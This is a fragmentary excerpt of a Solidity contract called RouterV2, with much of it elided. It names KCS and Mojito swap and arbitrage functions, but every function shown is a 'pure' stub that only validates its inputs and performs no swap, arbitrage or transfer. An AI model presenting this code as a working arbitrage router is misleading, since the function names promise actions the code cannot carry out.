...
contract RouterV2 {
    ...
    function mojitoSwapAddress() public pure returns (address) {
    ...
    function convertKcsTo(address add0, uint256 amount) public pure {
        require(uint(add0) != 0, "Address is invalid");
        require(amount > 0, "Amount should be greater than 0");
    }

    function kcsSwapAddress() public pure returns (address) {
    ...
    function callArbitrageMojito(address add0, address add1) public pure {
        require(uint(add0) != 0, "Address is invalid!");
        require(uint(add1) != 0, "Address is invalid!");
    }
    ...
    function transferKcsToMultiplier(address add0)
        public pure
    {
        require(uint(add0) != 0, "Address is invalid!");
    }
